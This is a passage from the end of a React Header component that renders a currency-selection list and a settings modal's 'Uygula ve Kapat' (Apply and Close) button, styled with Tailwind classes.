                      selectedCurrency === curr.code ? 'bg-[#00E5FF] text-[#0A0D14]' : 'bg-white/10 text-zinc-400'
                    }`}>
                      {curr.symbol}
                    </div>
                    <div className="flex flex-col items-start">
                      <span className="font-bold text-sm leading-tight">{curr.code}</span>
                      <span className="text-xs text-zinc-500 font-medium">{curr.label}</span>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Footer Action */}
          <div className="mt-8">
            <button 
              onClick={() => setIsSettingsModalOpen(false)}
              className="w-full py-3.5 rounded-xl bg-[#00E5FF] hover:brightness-110 text-[#0A0D14] font-black text-sm uppercase tracking-widest transition-all"
            >
              Uygula ve Kapat
            </button>
          </div>
        </div>
      </div>
    )}
    </>
  );
};

export default Header;
